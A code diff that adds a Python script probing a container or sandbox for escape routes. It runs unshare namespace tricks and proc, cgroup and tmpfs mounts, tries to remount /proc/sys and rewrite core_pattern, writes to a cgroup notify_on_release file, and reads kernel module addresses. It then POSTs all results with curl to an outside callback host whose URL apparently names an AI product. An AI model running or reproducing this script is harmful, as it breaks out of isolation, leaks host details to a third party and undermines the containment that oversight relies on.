@@ -1,1 +1,27 @@
-open('/tmp/p1mark','w').write('OK')
+import json, os, pathlib, subprocess, time
+OUT={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'pid':1,'uid':os.getuid(),'tests':{}}
+def run(name, cmd, timeout=40):
+ t=time.monotonic()
+ try:
+  p=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=timeout)
+  OUT['tests'][name]={'cmd':cmd,'rc':p.returncode,'stdout':p.stdout[-30000:],'stderr':p.stderr[-12000:],'elapsed':round(time.monotonic()-t,3)}
+ except Exception as e: OUT['tests'][name]={'cmd':cmd,'error':repr(e),'elapsed':round(time.monotonic()-t,3)}
+run('base','id; grep -E "^(Uid|Gid|Cap|NoNewPrivs|Seccomp):" /proc/self/status; cat /proc/self/cgroup; cat /proc/self/attr/current 2>&1')
+run('proc_root','unshare -Urpfm sh -c \'id; mount -t proc proc /proc 2>&1; echo RC=$?; cat /proc/sys/kernel/core_pattern 2>&1\'')
+run('proc_tmp','unshare -Urpfm sh -c \'mkdir -p /tmp/procp; mount -t proc proc /tmp/procp 2>&1; echo RC=$?; cat /tmp/procp/sys/kernel/core_pattern 2>&1\'')
+run('proc_mountopt','unshare -Urpfm --mount-proc=/tmp/procpm sh -c \'echo REACHED\'')
+run('cgroup2_C','unshare -UrmC sh -c \'mkdir -p /tmp/cg2; mount -t cgroup2 none /tmp/cg2 2>&1; echo RC=$?; findmnt -T /tmp/cg2 -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1; cat /tmp/cg2/cgroup.controllers 2>&1\'')
+run('cgroup1_C','unshare -UrmC sh -c \'mkdir -p /tmp/cg1; mount -t cgroup -o none,name=probe cgroup /tmp/cg1 2>&1; echo RC=$?; findmnt -T /tmp/cg1 -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1; ls -la /tmp/cg1 2>&1\'')
+run('cgroup2_pidC','unshare -UrpfmC sh -c \'mkdir -p /tmp/cg2p; mount -t cgroup2 none /tmp/cg2p 2>&1; echo RC=$?; findmnt -T /tmp/cg2p -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1; cat /tmp/cg2p/cgroup.controllers 2>&1\'')
+run('cgroup1_pidC','unshare -UrpfmC sh -c \'mkdir -p /tmp/cg1p; mount -t cgroup -o none,name=probe cgroup /tmp/cg1p 2>&1; echo RC=$?; findmnt -T /tmp/cg1p -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1; ls -la /tmp/cg1p 2>&1\'')
+run('tmpfs_userns','unshare -Urm sh -c \'mkdir -p /tmp/tfs; mount -t tmpfs tmpfs /tmp/tfs 2>&1; echo RC=$?; findmnt -T /tmp/tfs -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1\'')
+run('tmpfs_pid_userns','unshare -Urpfm sh -c \'mkdir -p /tmp/tfsp; mount -t tmpfs tmpfs /tmp/tfsp 2>&1; echo RC=$?; findmnt -T /tmp/tfsp -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1\'')
+run('bind_cgroup_remount','unshare -Urpfm sh -c \'mkdir -p /tmp/cgb; mount --bind /sys/fs/cgroup/systemd /tmp/cgb 2>&1; echo BIND=$?; mount -o remount,rw,bind /tmp/cgb 2>&1; echo REMOUNT=$?; ls -la /tmp/cgb 2>&1; printf x > /tmp/cgb/notify_on_release 2>&1; echo WRITE=$?\'')
+run('proc_sys_remount','mount -o remount,rw /proc/sys 2>&1; echo RC=$?; printf %s core.%p > /proc/sys/kernel/core_pattern 2>&1; echo WRC=$?; cat /proc/sys/kernel/core_pattern 2>&1')
+run('setuid_mount','mkdir -p /tmp/sm; /usr/bin/mount -t tmpfs tmpfs /tmp/sm 2>&1; echo RC=$?; findmnt -T /tmp/sm -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1')
+run('module_text','cat /sys/module/nf_tables/sections/.text 2>&1; cat /sys/module/nf_tables/coresize 2>&1; cat /sys/module/nf_tables/refcnt 2>&1')
+raw=json.dumps(OUT,sort_keys=True,separators=(',',':')).encode(); pathlib.Path('/tmp/p1res').write_bytes(raw)
+p=subprocess.run(['curl','-sS','-m','30','-X','POST','--data-binary','@/tmp/p1res','https://54.209.51.244.sslip.io/callback/snapgpt-proc-pid1-full-20261106'],capture_output=True,text=True,timeout=40)
+OUT['curl']={'rc':p.returncode,'stdout':p.stdout[-2000:],'stderr':p.stderr[-2000:]}
+pathlib.Path('/tmp/p1res').write_text(json.dumps(OUT,sort_keys=True,separators=(',',':')))
+print('P1FULL_OK')
